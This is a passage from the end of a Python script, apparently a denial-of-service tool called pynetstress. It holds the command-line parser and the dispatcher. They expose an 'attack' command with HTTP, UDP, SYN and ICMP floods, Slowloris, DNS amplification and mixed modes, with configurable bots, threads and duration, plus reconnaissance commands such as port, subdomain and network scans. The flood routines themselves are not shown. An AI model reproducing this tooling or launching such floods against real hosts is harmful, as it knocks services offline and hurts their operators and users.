  python pynetstress.py recon portscan example.com
  python pynetstress.py --debug attack example.com -m "Mixed Attack"
        """
    )
    
    subparsers = parser.add_subparsers(dest='command', help='Command to execute')
    
    # Attack command
    attack_parser = subparsers.add_parser('attack', help='Launch an attack')
    attack_parser.add_argument('target', help='Target URL or IP address')
    attack_parser.add_argument('-m', '--method', choices=['HTTP Flood', 'UDP Flood', 'SYN Flood', 'ICMP Flood', 'Slowloris', 'DNS Amplification', 'Mixed Attack'], 
                              default='HTTP Flood', help='Attack method')
    attack_parser.add_argument('-b', '--bots', type=int, default=100, help='Number of bots')
    attack_parser.add_argument('-t', '--threads', type=int, default=50, help='Threads per bot')
    attack_parser.add_argument('-d', '--duration', type=int, default=30, help='Attack duration in seconds')
    attack_parser.add_argument('-p', '--port', type=int, default=80, help='Target port')
    
    # Recon command
    recon_parser = subparsers.add_parser('recon', help='Reconnaissance tools')
    recon_subparsers = recon_parser.add_subparsers(dest='recon_command', help='Reconnaissance command')
    
    # Recon subcommands
    ping_parser = recon_subparsers.add_parser('ping', help='Ping a target')
    ping_parser.add_argument('target', help='Target to ping')
    
    traceroute_parser = recon_subparsers.add_parser('traceroute', help='Traceroute to a target')
    traceroute_parser.add_argument('target', help='Target for traceroute')
    
    portscan_parser = recon_subparsers.add_parser('portscan', help='Scan ports on a target')
    portscan_parser.add_argument('target', help='Target to scan')
    
    whois_parser = recon_subparsers.add_parser('whois', help='WHOIS lookup for a target')
    whois_parser.add_argument('target', help='Target for WHOIS lookup')
    
    dns_parser = recon_subparsers.add_parser('dns', help='DNS enumeration for a target')
    dns_parser.add_argument('target', help='Target for DNS enumeration')
    
    subdomain_parser = recon_subparsers.add_parser('subdomain', help='Subdomain scan for a target')
    subdomain_parser.add_argument('target', help='Target for subdomain scan')
    
    netscan_parser = recon_subparsers.add_parser('netscan', help='Network scan')
    netscan_parser.add_argument('network', help='Network to scan (CIDR notation)')
    
    speedtest_parser = recon_subparsers.add_parser('speedtest', help='Network speed test')
    
    # Reset command
    reset_parser = subparsers.add_parser('reset', help='Reset statistics')
    
    # Global debug flag
    parser.add_argument('--debug', action='store_true', help='Enable debug mode with detailed logging')
    
    args = parser.parse_args()
    
    # Set debug mode
    if hasattr(args, 'debug'):
        DEBUG_MODE = args.debug
    
    # Show help if no arguments provided
    if len(sys.argv) == 1:
        parser.print_help()
        return
    
    tool = PyNetStressTerminal()
    tool.print_banner()
    
    if args.command == 'attack':
        if not IS_ROOT and args.method in ['UDP Flood', 'SYN Flood', 'ICMP Flood', 'DNS Amplification']:
            print("[WARNING] This method requires root privileges. Some features may not work.")
        
        tool.start_attack(
            target=args.target,
            method=args.method,
            bots=args.bots,
            threads=args.threads,
            duration=args.duration,
            port=args.port
        )
    
    elif args.command == 'recon':
        if args.recon_command == 'ping':
            tool.ping(args.target)
        elif args.recon_command == 'traceroute':
            tool.traceroute(args.target)
        elif args.recon_command == 'portscan':
            tool.port_scan(args.target)
        elif args.recon_command == 'whois':
            tool.whois_lookup(args.target)
        elif args.recon_command == 'dns':
            tool.dns_enum(args.target)
        elif args.recon_command == 'subdomain':
            tool.subdomain_scan(args.target)
        elif args.recon_command == 'netscan':
            tool.network_scan(args.network)
        elif args.recon_command == 'speedtest':
            tool.speed_test()
        else:
            recon_parser.print_help()
    
    elif args.command == 'reset':
        tool.reset_stats()
    
    else:
        parser.print_help()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[INFO] Exiting...")
        sys.exit(0)
    except Exception as e:
        print(f"[ERROR] {e}")
        sys.exit(1)